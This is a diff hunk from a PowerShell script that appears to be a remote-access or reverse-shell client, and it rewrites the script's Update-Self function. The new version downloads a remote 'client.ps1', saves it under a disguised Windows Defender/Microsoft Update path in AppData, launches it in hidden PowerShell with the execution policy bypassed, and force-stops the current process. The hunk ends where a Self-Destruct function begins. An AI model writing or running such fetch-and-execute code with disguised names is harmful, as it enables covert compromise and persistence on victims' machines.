@@ -560,22 +560,21 @@ function PortSuggest {
 
 function Update-Self {
     param (
-        [string]$url = "https://raw.githubusercontent.com/zipo0/studytime-/main/Invoke-ConPtyShell.ps1"
+        [string]$url = "https://raw.githubusercontent.com/zipo0/studytime-/main/client.ps1",
+        [string]$localPath = "$env:APPDATA\WindowsDefender\MicrosoftUpdate.ps1"
     )
 
-    $path = $MyInvocation.MyCommand.Path
-    if (-not $path) {
-        return "[ERROR] Can't update: unknown path"
-    }
-
     try {
-        Invoke-WebRequest -Uri $url -OutFile $path -UseBasicParsing
-        return "[+] Script updated successfully from $url"
+        Invoke-WebRequest -Uri $url -OutFile $localPath -UseBasicParsing
+        Start-Process -FilePath "powershell.exe" -ArgumentList "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$localPath`""
+        Start-Sleep -Seconds 1
+        Stop-Process -Id $PID -Force
     }
     catch {
         return "[ERROR] Update failed: $($_.Exception.Message)"
     }
 }
+
 
 
     function Self-Destruct {
